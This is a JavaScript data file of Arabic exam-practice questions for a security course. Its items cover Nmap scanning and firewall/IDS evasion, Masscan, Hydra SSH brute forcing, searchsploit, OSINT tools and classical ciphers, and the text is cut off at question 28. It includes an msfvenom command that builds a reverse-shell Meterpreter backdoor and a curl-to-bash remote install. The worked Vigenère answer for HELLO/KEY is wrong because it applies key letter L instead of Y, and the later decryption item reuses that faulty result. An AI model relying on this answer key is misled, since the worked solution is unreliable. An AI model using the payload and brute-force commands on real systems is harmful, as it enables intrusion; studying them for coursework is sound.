/* ═══════════════════════════════════════════════════════════
   بنك التدريبات الكتابية — على شكل الاختبار الفعلي
   (وفق رسالة المندوب: اكتب الأمر + شفّر النص يدوياً + MCQ)
   30 تدريباً: 20 كتابة أوامر + 10 تشفير يدوي بحلول مفصلة
   جميع الأوامر بصيغها الحرفية من ملفات المقرر
   ═══════════════════════════════════════════════════════════ */
window.TOC_MODELS = window.TOC_MODELS || [];
window.TOC_MODELS.push({
  id: "sec2",
  kind: "كتابي",
  title_ar: "تدريبات على شكل الاختبار — اكتب الأمر + شفّر النص",
  origin_ar:
    "نمط الاختبار الفعلي (وفق رسالة المندوب عن كلام الدكتورة): لا تعاريف نظرية — بل «اكتب الأمر الذي يقوم بـ..» و«شفّر/فك النص التالي باستخدام الخوارزمية» وMCQ. الأوامر هنا بصيغها الحرفية من سلايدات المقرر وملفات أوامر كالي ونماذج الطلاب، والتشفير بحلول مفصلة حرفاً بحرف.",
  questions: [
    {
      n: 1,
      type: "essay",
      ref: "L1-S002",
      q_ar: "أنت داخل مجلد في نظام كالي لينكس. اكتب الأمرين الذين تعرف بهما المسار المطلق (Full Path) للمجلد الحالي، ثم تعرض جميع الملفات والمجلدات بما فيها المخفية مع صلاحياتها التفصيلية.",
      q_en: "Write the two commands that print the absolute path of the current directory, then list all files including hidden ones with detailed permissions.",
      ans_ar:
        "الأمر الأول: pwd\nيطلعك على المسار المطلق للمجلد الحالي (Print Working Directory) مثل: /root/sec_lab\n\nالأمر الثاني: ls -la\nالتفكيك: ls = سرد الملفات، -l = القائمة الطويلة (تفاصيل الصلاحيات والمالك والحجم والتاريخ)، -a = إظهار المخفية (All، بما فيها الملفات التي تبدأ بنقطة).\n\nفي الاختبار: لا تنسَ الـa للمخفية ولا الـl للصلاحيات — الأمر ls وحده يعطيك الأسماء فقط، وls -a بدون l يعطي المخفية بلا تفاصيل. الطلب هنا يجمع الاثنين: ls -la.",
    },
    {
      n: 2,
      type: "essay",
      ref: "L1-S002",
      q_ar: "أنشئ مجلداً جديداً باسم sec_lab وادخل إليه مباشرة، ثم أنشئ ملف سكربت باسم scan.sh وامنحه صلاحيات التنفيذ للمالك (قراءة + كتابة + تنفيذ للمالك فقط، والبقية قراءة وتنفيذ).",
      q_en: "Create a folder named sec_lab, enter it, then create scan.sh and grant it 755 permissions.",
      ans_ar:
        "mkdir sec_lab && cd sec_lab\n\nثم إنشاء الملف: touch scan.sh\n\nمنح الصلاحيات: chmod 755 scan.sh\n\nتفكيك 755 (أرقام ثلاثية: المالك / المجموعة / الآخرون):\n7 = 4+2+1 = قراءة + كتابة + تنفيذ (rwx) للمالك\n5 = 4+1 = قراءة + تنفيذ (r-x) للمجموعة\n5 = 4+1 = قراءة + تنفيذ (r-x) للآخرين\n\nفي الاختبار: احفظ الأرقام الثمانية: 7=rwx، 6=rw-، 5=r-x، 4=r--، 0=لا شيء. فخ شائع: قلب ترتيب الأرقام — الأول دائماً للمالك وليس للآخرين.",
    },
    {
      n: 3,
      type: "essay",
      ref: "L3-S016",
      q_ar: "اكتب أمر Nmap الذي يفحص الشبكة الفرعية 192.168.0.0/24 لمعرفة أي الأجهزة نشطة ومتاحة (Ping Sweep) دون فحص المنافذ.",
      q_en: "Write the Nmap command that ping-sweeps the subnet 192.168.0.0/24 to find active hosts without port scanning.",
      ans_ar:
        "الأمر: nmap -sP 192.168.0.0/24\n\nالتفكيك: nmap = الأداة، -sP = مسح Ping فقط (الـP من Ping)، 192.168.0.0/24 = الشبكة الفرعية كاملة (254 مضيفاً محتملاً).\n\nوظيفته كما في السلايد: يحدد مواقع الأجهزة (locates machines)، يتأكد أنها تستجيب (responding)، يكشف الأجهزة غير المتوقعة (unexpected machines)، وينتج قائمة بالأجهزة النشطة والمتاحة فقط — بلا أي فحص منافذ.\n\nفي الاختبار: -sP للمضيفين الحيين، وليس للمنافذ. من يكتب nmap 192.168.0.0/24 بدون -sP يفحص المنافذ الافتراضية أيضاً وهذا ليس المطلوب هنا.",
    },
    {
      n: 4,
      type: "essay",
      ref: "L4-S018",
      q_ar: "أثناء فحص هدف 192.168.1.50 اكتشفت أن المنفذ 21 مفتوح وتريد معرفة اسم الخدمة وإصدارها الدقيق. اكتب الأمر.",
      q_en: "Write the Nmap command to detect the exact service name and version running on target 192.168.1.50.",
      ans_ar:
        "الأمر: nmap -sV 192.168.1.50\n\nالتفكيك: -sV = Service Version detection — يستجوب الخدمة على كل منفذ مفتوح ليحدد اسمها وإصدارها الدقيق (مثلاً: 21/tcp open ftp vsftpd 2.3.4).\n\nلماذا مهم؟ الإصدار الدقيق هو مفتاح البحث عن الثغرات: خذ الناتج (vsftpd 2.3.4) وابحث عنه في جوجل أو Exploit-DB أو بـsearchsploit — وهذا بالضبط تسلسل عمل المقرر: اكتشاف المنفذ ← -sV للإصدار ← البحث عن استغلال.\n\nفي الاختبار: الفحص الافتراضي nmap <ip> يعطي اسم الخدمة الظاهر فقط (ftp) بلا إصدار؛ الإصدار يحتاج -sV.",
    },
    {
      n: 5,
      type: "essay",
      ref: "L4-S018",
      q_ar: "اكتب أمرين: الأول يفحص منفذاً محدداً واحداً هو 22 على الهدف 192.168.1.50، والثاني يفحص جميع المنافذ الـ65535 عليه.",
      q_en: "Write two commands: one to scan only port 22 on 192.168.1.50, and one to scan all 65535 ports.",
      ans_ar:
        "منفذ محدد: nmap -p22 192.168.1.50\n\nجميع المنافذ: nmap -p- 192.168.1.50\n\nالتفكيك: -p يليه رقم المنفذ = فحص ذلك المنفذ فقط (الأسرع عندما تعرف ماذا تريد). أما -p- (حرف p ثم شرطة) = فحص كل المنافذ من 1 إلى 65535 — بطيء لكنه شامل ويكشف الخدمات على منافذ غير معتادة.\n\nفي الاختبار: لا تحذف الشرطة! nmap -p- شيء وnmap -p شيء آخر. وتذكر: الفحص الافتراضي بدون خيارات يفحص أشهر 1000 منفذ فقط — ليس كلها ولا واحداً.",
    },
    {
      n: 6,
      type: "essay",
      ref: "L3-S010",
      q_ar: "تريد معرفة نظام التشغيل الذي يعمل به الهدف 172.16.1.1. اكتب أمر Nmap المناسب.",
      q_en: "Write the Nmap command to detect the operating system of host 172.16.1.1.",
      ans_ar:
        "الأمر: nmap -O 172.16.1.1\n\nالتفكيك: -O = OS Detection (حرف O من Operating System). يعمل بتحليل خصائص حزم TCP/IP التي يرسلها الهدف (مثل بصمة نافذة TCP وقيم TTL وخيارات الرأس) ومقارنتها بقاعدة بصمات الأنظمة.\n\nالناتج النموذجي: OS details: Linux 5.4 - 5.8 أو Microsoft Windows 10 — وكلما كان الهدف أكثر تعاوناً (منافذ مفتوحة أكثر) كانت البصمة أدق.\n\nفي الاختبار: -O لنظام التشغيل، -sV لإصدار الخدمة — لا تخلط بينهما. ولهما صيغة مدمجة شائعة: nmap -sV -O <ip> لإصدارات الخدمات ونظام التشغيل معاً.",
    },
    {
      n: 7,
      type: "essay",
      ref: "L4-S018",
      q_ar: "اكتب أمر Nmap الذي ينفذ مسح SYN التخفي (Half-open) على أول 1000 منفذ من الهدف 192.168.1.50، واشرح لماذا يسمى نصف مفتوح.",
      q_en: "Write the Nmap command for a SYN (half-open) stealth scan on 192.168.1.50 and explain why it is called half-open.",
      ans_ar:
        "الأمر: nmap -sS 192.168.1.50 (ومعه نطاق المنافذ تلقائياً أشهر 1000 منفذ — أو صراحة: sudo nmap -sS -p 1-1000 192.168.1.50)\n\nالتفكيك: -sS = SYN Scan. يرسل SYN، فإن رجع SYN/ACK عرف أن المنفذ مفتوح فيرسل RST فوراً لقطع الاتصال قبل إكماله.\n\nلماذا «نصف مفتوح» (Half-open)؟ لأن المصافحة الثلاثية (SYN ← SYN/ACK ← ACK) لا تكتمل — نقطتان فقط ثم نقتل الاتصال. الفائدة: أسرع من TCP Connect العادي وأصعب على السجلات لأن تطبيق الخدمة لا يسجل اتصالاً مكتملاً.\n\nفي الاختبار: -sS = SYN/تخفي، -sT = TCP Connect كامل (الافتراضي بدون صلاحيات root). يتطلب -sS صلاحيات root: sudo nmap -sS ...",
    },
    {
      n: 8,
      type: "essay",
      ref: "L4-S018",
      q_ar: "الهدف 192.168.1.60 لا يستجيب للـping وتظن أن جدار حماية يمنعه. اكتب أمر Nmap الذي يتجاوز هذه المشكلة ويفحصه بدون ping أصلاً.",
      q_en: "Write the Nmap option that treats the host as up and scans it without any ping (bypassing firewall blocking of ICMP).",
      ans_ar:
        "الأمر: nmap -Pn 192.168.1.60\n\nالتفكيك: -Pn = No Ping scan — يعامل الهدف على أنه حي ويدخل في فحص المنافذ مباشرة دون مرحلة اكتشاف المضيف بالـping.\n\nمتى تستخدمه؟ عندما يمنع الجدار الحماية رسائل ICMP فيبدو الهدف «ميتاً» في المسح العادي رغم أن منافذه مفتوحة. الـP كبيرة ثم n — ومعناها تعطيل كل محاولات اكتشاف المضيف.\n\nفي الاختبار: فخ شائع — كتابة -pN (صغيرة أولاً) أو -nP؛ الصحيح -Pn. وأيضاً لا تخلطه مع -p (المنفذ) ولا مع -f (التجزئة).",
    },
    {
      n: 9,
      type: "essay",
      ref: "L4-S018",
      q_ar: "لكشف ما إذا كان الهدف 172.16.1.1 يستخدم جدار حماية، قررت تجزئة حزم الفحص إلى قطع صغيرة يصعب على الجدار تجميعها. اكتب الأمر.",
      q_en: "Write the Nmap command that fragments scan packets into tiny pieces to slip past firewalls.",
      ans_ar:
        "الأمر: nmap -f 172.16.1.1\n\nالتفكيك: -f = Fragmented scan — يقسم رأس حزمة الفحص (مثل SYN) عبر عدة حزم IP صغيرة (8 بايت أو أقل لكل جزء)، فالجدار الحماية الرخيص الذي لا يعيد تجميع القطع قبل فحصها لن يتعرف على الفحص.\n\nمن ملف أوامر Nmap في المقرر توجد أيضاً صيغ تجزئة متقدمة بنفس الغرض: nmap -mtu [MTU] لتحديد حجم وحدة النقل، وnmap -data-length [size] لإضافة بيانات لحزم الفحص وتغيير حجمها المعتاد.\n\nفي الاختبار: -f = تجزئة، -Pn = بدون ping، -D = طُعم — ثلاث تقنيات تجاوز مختلفة لا تخلطها.",
    },
    {
      n: 10,
      type: "essay",
      ref: "L4-S018",
      q_ar: "اكتب أمر Nmap الذي يستخدم السكربتات للبحث عن الثغرات المعروفة على الهدف 192.168.1.10، واذكر أين تجد جميع السكربتات المتاحة في النظام.",
      q_en: "Write the Nmap command that runs vulnerability scripts against 192.168.1.10, and state where all available scripts live on disk.",
      ans_ar:
        "الأمر: nmap --script vuln 192.168.1.10\n\nالتفكيك: --script vuln = تشغيل مجموعة سكربتات فئة الثغرات من محرك NSE (Nmap Scripting Engine) ضد الهدف — تفحص الخدمات المفتوحة وتقارر عن الثغرات المعروفة.\n\nمكان جميع السكربتات: /usr/share/nmap/scripts\n\nمثال مخصص من نماذج الطلاب لثغرة معروفة: nmap -p 21 --script ftp-vsftpd-backdoor 192.168.1.10\n\nفي الاختبار: اكتب الـ- مرتين في --script (خطأ شائع كتابتها -script بواحدة). وفئة vuln هي للثغرات بينما فئة auth لاختبار المصادقة.",
    },
    {
      n: 11,
      type: "essay",
      ref: "L4-S029",
      q_ar: "لديك قائمة أهداف كثيرة في ملف scan.txt وتريد أن يقرأها Nmap منها مباشرة. اكتب الأمر.",
      q_en: "Write the Nmap option to read the target list from the file scan.txt.",
      ans_ar:
        "الأمر: nmap -iL scan.txt\n\nالتفكيك: -iL = Input from List — يقرأ الأهداف سطراً سطراً من الملف، ويقبل الملف كل صيغ الأهداف: عناوين IP فردية، أسماء نطاقات، نطاقات CIDR مثل 192.168.1.0/24، وسلاسل مثل 10.0.0.1-50.\n\nملاحظة من المقرر: أداة Masscan تستخدم نفس الفكرة بصيغة: masscan -p80 -iL ip_address.txt\n\nفي الاختبار: -iL لقراءة الأهداف من ملف، بينما خيارات الإخراج -oN/-oG/-oX/-oA لحفظ النتائج — اتجاهان متعاكسان لا تخلطهما.",
    },
    {
      n: 12,
      type: "essay",
      ref: "L3-S017",
      q_ar: "لإخفاء هويتك، تريد تنفيذ مسح على 192.168.1.1 يبدو وكأنه صادر من 10 عناوين IP عشوائية وهمية إلى جانب عنوانك. اكتب الأمر.",
      q_en: "Write the Nmap command that launches a decoy scan using 10 random fake source IPs.",
      ans_ar:
        "الأمر: nmap -D RND:10 192.168.1.1\n\nالتفكيك: -D = Decoys (الطُعم)، RND:10 = ولّد 10 عناوين عشوائية. عند الهدف تبدو محاولات الفحص قادمة من 11 مصدراً (الطُعم + أنت) فيصعب تحديد الفاحص الحقيقي.\n\nيمكن أيضاً تحديد الطُعم بالاسم صراحة: nmap -D decoy1,decoy2,RND,RND <ip>\n\nفي الاختبار: RND بأحرف كبيرة والرقم بعده بنقطتين. هذه تقنية تخفي مختلفة عن -f (تجزئة الحزم) و-T (إبطاء السرعة) — الثلاث تحاول التقليل من الكشف لكن بآليات مختلفة.",
    },
    {
      n: 13,
      type: "essay",
      ref: "L3-S017",
      q_ar: "تريد أبطأ مسح ممكن لتفادي أنظمة كشف التسلل IDS. اكتب أمر Nmap مع قالب التوقيت المناسب، واذكر ماذا تعني الأرقام من T0 إلى T5.",
      q_en: "Write the Nmap command using the slowest timing template to evade IDS, and explain templates T0 through T5.",
      ans_ar:
        "الأمر: nmap -T0 192.168.1.1\n\nالتفكيك: -T يليه رقم من 0 إلى 5 يتحكم بسرعة وإيقاع المسح:\nT0 = Paranoid (المرتاب) — الأبطأ على الإطلاق؛ يرسل_probe كل 5 دقائق، شبه مستحيل على IDS التقاطه لكنه بطيء جداً عملياً.\nT1 = Sneaky (المتسلل) — بطيء جداً، نحو 15 ثانية بين الطلبات.\nT2 = Polite — مهذب يقلل استهلاك الشبكة.\nT3 = Normal — الافتراضي.\nT4 = Aggressive — سريع، يفترض شبكة جيدة.\nT5 = Insane — أسرع شيء، يضحي بالدقة.\n\nفي الاختبار: للإبطاء والتخفي = T0، ولأسرع فحص = T5. طريقة تذكرها: الأصفر صفر مرتاب (خائف فيبطئ) والمجنون 5 يجري بلا عقل.",
    },
    {
      n: 14,
      type: "essay",
      ref: "L3-S009",
      q_ar: "تريد مسح الشبكة 172.16.1.0/24 لكن استثناء المضيف 172.16.1.1 (الراوتر). اكتب الأمر.",
      q_en: "Write the Nmap command to scan subnet 172.16.1.0/24 while excluding host 172.16.1.1.",
      ans_ar:
        "الأمر: nmap 172.16.1.0/24 --exclude 172.16.1.1\n\nالتفكيك: --exclude يليه عنوان (أو قائمة مفصولة بفواصل) يُستثنى من الفحص — مفيد لتفادي الراوتر أو جهاز حساس أو جهاز تعرف أنه يطفّئ الفحص.\n\nيمكن أيضاً استثناء من ملف: --excludefile <file>\n\nولها نظير في Masscan من سلايدات المقرر: masscan -p80 192.168.0.0/16 --exclude 192.168.1.1,192.168.2.1\n\nفي الاختبار: --exclude بشرطتين وليست -exclude. ولاحظ الفرق عن -iL (إدخال أهداف) — هذا إخراج هدف من القائمة.",
    },
    {
      n: 15,
      type: "essay",
      ref: "L4-S024",
      q_ar: "اكتب أمر Masscan الذي يمسح المنافذ 80 و443 و8080 على الشبكة 192.168.1.0/24، ثم صيغة معدلة تضبط معدل الحزم على 10000 حزمة/ثانية، ثم صيغة تحفظ النتيجة بصيغة XML.",
      q_en: "Write Masscan commands to: scan ports 80,443,8080 on 192.168.1.0/24; the same with --rate=10000; and a variant saving output as XML.",
      ans_ar:
        "الأساسية: masscan -p80,443,8080 192.168.1.0/24\n\nمع معدل الحزم: masscan -p80 192.168.1.0/24 --rate=10000\n\nبحفظ النتيجة XML: masscan -p80 192.168.1.0/24 -oX results.xml\n\nالتفكيك: -p يليه المنافذ مفصولة بفواصل (مثل Nmap)، --rate يتحكم بعدد الحزم المرسلة في الثانية — وهذا سر Masscan الأسطوري (يفحص الإنترنت كله في دقائق)، -oX للإخراج بصيغة XML.\n\nصيغ إضافية من السلايدات: مسح CIDR واسع: masscan -p80 192.168.0.0/16 — وقراءة أهداف من ملف: masscan -p80 -iL ip_address.txt\n\nفي الاختبار: يميز Masscan بسرعته (--rate) — أما Nmap فوظيفته العمق والتفاصيل. سؤال «أيهما أسرع؟» شبه مؤكد.",
    },
    {
      n: 16,
      type: "essay",
      ref: "L1-S020",
      q_ar: "اكتب أمر Hydra الذي يهاجم خدمة SSH على 192.168.1.10 بقائمة مستخدمين users.txt وقائمة كلمات مرور passwords.txt.",
      q_en: "Write the Hydra command that brute-forces SSH on 192.168.1.10 using users.txt and passwords.txt.",
      ans_ar:
        "الأمر: hydra -L users.txt -P passwords.txt ssh://192.168.1.10\n\nالتفكيك حرفياً كما في ملف أوامر كالي:\n-L = ملف قائمة المستخدمين (Login من ملف، حرف كبير)\n-P = ملف قائمة كلمات المرور (Password من ملف، حرف كبير)\nssh://192.168.1.10 = الخدمة والهدف بالصيغة service://target_ip\n\nالفرق المهم: -l (صغيرة) = مستخدم واحد بالاسم، -L (كبيرة) = قائمة من ملف. ونفس المنطق -p كلمة واحدة / -P ملف كلمات.\n\nفي الاختبار: Hydra تهاجم الخدمات عن بُعد (Online Brute Force) — تخالف John وHashcat اللذين يكسران ملفات hash محلية بلا اتصال بالخدمة.",
    },
    {
      n: 17,
      type: "essay",
      ref: "L4-S013",
      q_ar: "بعد أن كشف الفحص أن الهدف يشغّل WordPress إصدار 5.0، اكتب الأمر الذي يبحث عن استغلالات لهذا الإصدار من قاعدة Exploit-DB المحلية.",
      q_en: "Write the command that searches the local Exploit-DB database for exploits matching WordPress 5.0.",
      ans_ar:
        "الأمر: searchsploit wordpress 5.0\n\nالتفكيك: searchsploit أداة البحث في نسخة محلية من قاعدة Exploit-DB — تبحث في الاستغلالات المتاحة دون إنترنت. الصيغة العامة: searchsploit [options] search_term\n\nالمنطق داخل المقرر: بعد nmap -sV يعطيك (WordPress 5.0) ← خذ السلسلة «الخدمة + الإصدار» وابحث بها — إما في جوجل أو Exploit-DB أو searchsploit. هذا حرفياً تسلسل سلايد «بعد معرفة إصدار الخدمة، انسخه واذهب وابحث عن الثغرات».\n\nفي الاختبار: قد يأتي السؤال عكسياً — «وظّف الناتج vsftpd 2.3.4» فتكتب: searchsploit vsftpd 2.3.4",
    },
    {
      n: 18,
      type: "essay",
      ref: "L1-S015",
      q_ar: "اكتب أمر msfvenom الذي ينشئ حمولة Meterpreter باتصال عكسي (reverse TCP) لنظام لينكس 32-bit، تربط لIP المحلي 192.168.1.100 على المنفذ 4444، بصيغة ملف ELF تنفيذي باسم backdoor داخل /tmp.",
      q_en: "Write the msfvenom command that generates a Linux x86 reverse TCP Meterpreter payload bound to 192.168.1.100:4444, output as an ELF file /tmp/backdoor.",
      ans_ar:
        "الأمر: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o /tmp/backdoor\n\nالتفكيك كما في ملف أوامر كالي:\n-p payload = نوع الحمولة (هنا Meterpreter عكسية على لينكس x86)\nLHOST = عنوان جهازك أنت (المستمع الذي سيتصل إليه الضحية)\nLPORT = منفذ الاستماع (4444 الافتراضي المعتاد)\n-f format = صيغة الملف الناتج (elf تنفيذي لينكس)\n-o output = مسار حفظ الملف\n\nفي الاختبار: LHOST عنوانك وليس عنوان الضحية — اتصال عكسي يعني الضحية تتصل بك. وفخ شائع: نسيان -f أو وضع LHOST للهدف بدل جهازك.",
    },
    {
      n: 19,
      type: "essay",
      ref: "L2-S009",
      q_ar: "اكتب أمر theHarvester الذي يجمع معلومات عن نطاق tesla.com من محرك Bing بحد 200 نتيجة ويحفظ التقرير باسم tesla-report.",
      q_en: "Write the theHarvester command that gathers data on tesla.com from Bing, limited to 200 results, saving the report as tesla-report.",
      ans_ar:
        "الأمر: theHarvester -d tesla.com -b bing -l 200 -f tesla-report\n\nالتفكيك حرفياً من سلايدات OSINT:\n-d domain = النطاق المستهدف\n-b source = مصدر البحث (bing وغيرها: google، linkedin، twitter، shodan...)\n-l limit = أقصى عدد نتائج\n-f file = حفظ التقرير باسم معين\n\nالصيغة العامة: theHarvester -d <domain> -b <source> [options]\n\nفي الاختبار: theHarvester = أداة استطلاع سلبي (OSINT) تجمع الإيميلات والأسماء والنطاقات الفرعية من المصادر العامة — بلا أي اتصال مباشر بالهدف، وهذا جوهر الفرق بينها وبين Nmap (استطلاع نشط يلمس الهدف).",
    },
    {
      n: 20,
      type: "essay",
      ref: "L2-S005",
      q_ar: "لجمع ملفات من موقع شركة (Metadata Harvesting): اكتب أمر wget الذي ينزل الملفات من مجلد https://megacorpone.com/assets/ بشكل تكراري بعمق مستوى واحد، متجاهلاً مشكلة شهادة HTTPS، وبأنواع pdf وjpg وdocx فقط.",
      q_en: "Write the wget command that recursively downloads pdf/jpg/docx files from megacorpone.com/assets/ at depth 1, ignoring TLS certificate issues.",
      ans_ar:
        "الأمر: wget --no-check-certificate -r -l 1 -A pdf,jpg,docx https://megacorpone.com/assets/\n\nالتفكيك كما في ملف المختبر:\nwget = أداة التنزيل\n--no-check-certificate = تجاهل مشكلة شهادة HTTPS\n-r = recursive تنزيل تكراري يتبع الروابط\n-l 1 = عمق مستوى واحد (level)\n-A = أنواع الملفات المقبولة فقط (Accept)\n\nالغاية: تنزيل مستندات وصور الشركة ثم فحص بياناتها الميتاداتا (بيانات EXIF المخفية داخل الملفات) بأداة مثل ExifTool — الميتاداتا قد تكشف أسماء الموظفين، برامج التحرير، وأجهزة التصوير.\n\nفي الاختبار: كل علم وظيفته — من ينسى -A ينزل كل شيء، ومن ينسى -r لا يتبع الروابط أصلاً.",
    },
    {
      n: 21,
      type: "essay",
      ref: "L2-S005",
      q_ar: "اكتب أمر تثبيت أداة PhoneInfoga بنقرة واحدة عبر سكربت التثبيت الرسمي من GitHub، ثم أمر نقل الملف التنفيذي إلى مسار أوامر النظام باسم phoneinfoga.",
      q_en: "Write the one-line install command for PhoneInfoga from its official GitHub script, then the command that installs the binary system-wide.",
      ans_ar:
        "التثبيت: bash <( curl -sSL https://raw.githubusercontent.com/sundowndev/phoneinfoga/master/support/scripts/install )\n\nالنقل للنظام: sudo install ./phoneinfoga /usr/local/bin/phoneinfoga\n\nالتفكيك كما في ملف المختبر:\ncurl -sSL: تنزيل السكربت — s صامت (تفاصيل أقل)، S يعرض الأخطاء، L يتبع التحويلات إن تغير الرابط.\nbash <(...) : تنفيذ الناتج مباشرة كسكربت.\nsudo install ./phoneinfoga /usr/local/bin/ : نسخ الملف التنفيذي إلى مسار الأوامر بحيث تشغّله من أي مكان — وإلا فلن يجده النظام إلا من داخل مجلده.\n\nفي الاختبار: PhoneInfoga أداة OSINT لتحليل أرقام الهواتف (المشغل، الدولة، صيغ الرقم) — إعدادها في المختبر كان بهذين الأمرين حرفياً.",
    },
    {
      n: 22,
      type: "essay",
      ref: "L6-S011",
      q_ar: "شفّر كلمة SECURITY بشيفرة قيصر (Caesar Cipher) بمفتاح 4. اعرض خطوات الحل حرفاً بحرف.",
      q_en: "Encrypt the word SECURITY using the Caesar cipher with key 4. Show the step-by-step working.",
      ans_ar:
        "الناتج: WIGYVMXC\n\nالخطوات (الفهرس من A=0 إلى Z=25، والقاعدة: newIndex = (index + key) mod 26):\nS (18) + 4 = 22 ← W\nE (4) + 4 = 8 ← I\nC (2) + 4 = 6 ← G\nU (20) + 4 = 24 ← Y\nR (17) + 4 = 21 ← V\nI (8) + 4 = 12 ← M\nT (19) + 4 = 23 ← X\nY (24) + 4 = 28 → 28-26 = 2 ← C\n\nلاحظ الحرف الأخير Y: تجاوز الـZ فيلف (wrap-around) حول الأبجدية بالنقصان 26 — وهذه أهم نقطة يفشل فيها الطلاب.\n\nقاعدة سريعة للتحقق: عدّ المسافة بين S وW بالأصابع = 4 خطوات. من يتردد في الفهرسة يتحقق هكذا يدوياً.",
    },
    {
      n: 23,
      type: "essay",
      ref: "L6-S011",
      q_ar: "شفّر كلمة LAZYFOX بشيفرة قيصر بمفتاح 3 — انتبه: الكلمة تحتوي حروفاً من آخر الأبجدية فستحتاج اللف (Wrap-around) ثلاث مرات.",
      q_en: "Encrypt LAZYFOX with the Caesar cipher using key 3 — the word forces you to apply wrap-around three times.",
      ans_ar:
        "الناتج: ODCBIRA\n\nالخطوات:\nL (11) + 3 = 14 ← O\nA (0) + 3 = 3 ← D\nZ (25) + 3 = 28 → 2 ← C (لفت حول الأبجدية)\nY (24) + 3 = 27 → 1 ← B (لف)\nF (5) + 3 = 8 ← I\nO (14) + 3 = 17 ← R\nX (23) + 3 = 26 → 0 ← A (لف — عاد لبداية الأبجدية!)\n\nلاحظ X بمفتاح 3 يعطي 26 وهو أول حرف A — لأن Z=25 آخر فهرس. أي نتيجة أكبر من 25 اطرح منها 26.\n\nفي الاختبار: هذا النمط (كلمات بحروف X,Y,Z) مصمم لاختبار اللف. القاعدة الذهبية: mod 26 — أي القسمة على 26 وأخذ الباقي.",
    },
    {
      n: 24,
      type: "essay",
      ref: "L6-S012",
      q_ar: "فك تشفير النص التالي بشيفرة قيصر بمفتاح 3: DWWDFNGDZQ",
      q_en: "Decrypt the following Caesar ciphertext with key 3: DWWDFNGDZQ",
      ans_ar:
        "الناتج: ATTACKDAWN\n\nالتشفير كان إزاحة +3، ففك التشفير إزاحة -3 (أو +23 — نفس الشيء):\nD (3) - 3 = 0 ← A\nW (22) - 3 = 19 ← T\nW ← T\nD ← A\nF (5) - 3 = 2 ← C\nN (13) - 3 = 10 ← K\nG (6) - 3 = 3 ← D\nD ← A\nZ (25) - 3 = 22 ← W\nQ (16) - 3 = 13 ← N\n\nتذكر الاتجاه: التشفير Encryption = +key، والفك Decryption = -key. من يخلط الاتجاهين يشفر نصاً مشفراً فيزداد تدهوراً.\n\nتحقق ذكي: الناتج يجب أن يكون كلمات إنجليزية مقروءة — إن خرج لك ركيك فالاتجاه خطأ غالباً.",
    },
    {
      n: 25,
      type: "essay",
      ref: "L6-S012",
      q_ar: "وصلتك رسالة مشفرة بقيصر ولا تعرف المفتاح: KHOOR. اشرح كيف تفكها بالقوة الغاشمة (Brute Force) ثم أعط النص الأصلي.",
      q_en: "You received a Caesar ciphertext with an unknown key: KHOOR. Explain how to brute-force it and give the plaintext.",
      ans_ar:
        "الطريقة: فضاء مفاتيح قيصر صغير جداً — 25 إزاحة ممكنة فقط (1 إلى 25). جرّبها بالتتابع حتى تظهر كلمة إنجليزية سليمة:\nإزاحة 1: JGNNQ ← ركيكة\nإزاحة 2: IFMMP ← ركيكة\nإزاحة 3: HELLO ← كلمة صحيحة! توقف.\n\nالناتج: HELLO والمفتاح 3.\n\nلماذا ينكسر قيصر بهذه السهولة؟ لأن عدد المفاتيح 25 فقط — جرّبها كلها في دقيقة يدوياً. وهذه نقطة اختبارية متكررة: سرية قيصر ضعيفة لأن فضاء المفاتيح صغير جداً، وهو ما دفع لتطوير شيفرات متعددة الأبجديات مثل Vigenère.\n\nفي الاختبار: قد يعطونك نصاً ومفتاحاً مجهولاً ويطلبون الناتج — ابدأ بالتجريب من 1 إلى 5 غالباً لأن المفاتيح الصغيرة شائعة في التدريبات.",
    },
    {
      n: 26,
      type: "essay",
      ref: "L6-S010",
      q_ar: "شفّر كلمة HELL O... بل الأدق: شفّر كلمة HELLO بشيفرة فيجينير (Vigenère Cipher) بالمفتاح KEY. اعرض جدول الحساب كاملاً.",
      q_en: "Encrypt HELLO with the Vigenère cipher using the key KEY. Show the full computation table.",
      ans_ar:
        "الناتج: RIWVS\n\nالمفتاح KEY أقصر من النص فيتكرر دورياً فوق الحروف: K-E-Y-K-E\n\nالقاعدة لكل حرف: C = (P + K) mod 26 حيث P حرف النص وK حرف المفتاح:\nH (7) + K (10) = 17 ← R\nE (4) + E (4) = 8 ← I\nL (11) + L (11) = 22 ← W\nL (11) + K (10) = 21 ← V\nO (14) + E (4) = 18 ← S\n\nلاحظ أن حرف L ظهر مرتين وتشفّر بشكلين مختلفين (W ثم V) — لأن حرف المفتاح فوقه اختلف. هذه هي نقطة قوة فيجينير على قيصر: تحليل تكرار الحروف ينكسر لأن الحرف الواحد يصير حروفاً متعددة.\n\nفي الاختبار: الخطأ الأول للطلاب نسيان تكرار المفتاح — اكتب المفتاح فوق النص حرفاً بحرف قبل أن تحسب أي شيء.",
    },
    {
      n: 27,
      type: "essay",
      ref: "L6-S010",
      q_ar: "شفّر كلمة NETWORK بشيفرة فيجينير بالمفتاح SEC (سيتكرر: SECSEC...). اعرض الحساب حرفاً بحرف.",
      q_en: "Encrypt NETWORK with the Vigenère cipher using key SEC (repeated as SECSEC...). Show the letter-by-letter working.",
      ans_ar:
        "الناتج: FIVOSTC\n\nالمفتاح الممتد فوق النص: S-E-C-S-E-C\n\nالحساب (P + K) mod 26:\nN (13) + S (18) = 31 → 31-26 = 5 ← F\nE (4) + E (4) = 8 ← I\nT (19) + C (2) = 21 ← V\nW (22) + S (18) = 40 → 40-26 = 14 ← O\nO (14) + E (4) = 18 ← S\nR (17) + C (2) = 19 ← T\nK (10) + S (18) = 28 → 28-26 = 2 ← C\n\nثلاث حالات لف هنا (31، 40، 28 كلها فوق 25) — اطرح 26 من أي ناتج يتجاوز 25.\n\nفي الاختبار: فخ شائع عند K السابعة: يظن الطالب أن المفتاح انتهى عند حرف C فيوقف — لا، المفتاح يدور من أوله تلقائياً حتى يغطي كل النص.",
    },
    {
      n: 28,
      type: "essay",
      ref: "L6-S010",
      q_ar: "فك تشفير RIWVS بشيفرة فيجينير بالمفتاح KEY.",
      q_en: "Decrypt RIWVS using the Vigenère cipher with key KEY.",
      ans_ar:
